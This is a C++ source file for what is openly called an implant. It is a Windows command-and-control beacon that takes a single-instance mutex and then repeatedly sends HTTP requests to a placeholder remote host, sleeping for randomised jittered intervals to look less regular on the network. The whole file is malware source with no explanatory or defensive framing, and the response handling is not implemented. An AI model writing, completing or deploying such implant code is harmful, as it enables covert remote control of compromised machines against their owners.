#include "implant.h"
#include "xhttp.h"
#include <chrono>
#include "mingw.thread.h"
#include <random>
#include <stdexcept>
#include <iostream>
#include <future>
#include <string>
#include <windows.h>
#include <pthread.h>

namespace implant {
std::string url = "REMOTE-HOST";
const int baseWaitTime = 200; //ms
const double maxJitter = 0.3 * baseWaitTime; // 30% of base wait time
// Calculate the final wait time with jitter
std::random_device rd;
std::mt19937 gen(rd());
std::uniform_real_distribution<> distrib(-maxJitter, maxJitter);
double jitter = distrib(gen);
int waitTimeWithJitter = baseWaitTime + static_cast<int>(jitter);

bool isRunning = true;

void beacon() {
    HANDLE hMutex;
    hMutex = CreateMutexA(NULL, FALSE, "BeaconMutex");
    // check if the mutex already exists
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        // if this process created the mutex, exit the application
        if (hMutex && GetLastError() == ERROR_ALREADY_EXISTS) {
        printf("BeaconMutex already exists, beacon already running\n");
        CloseHandle(hMutex);
        return;
        }
    }
    while (isRunning) {
        try {
            std::string response = xhttp::http_get(url);

            // Sleep for the calculated time
            mingw_stdthread::this_thread::sleep_for(std::chrono::milliseconds(waitTimeWithJitter));
        }
        catch (const std::exception& e) {
            //printf("\nBeaconing error: %s\n", e.what());
            mingw_stdthread::this_thread::sleep_for(std::chrono::milliseconds(waitTimeWithJitter));
        }
    }
    // cleanup
    if (hMutex)
        CloseHandle(hMutex);
    return;
}


}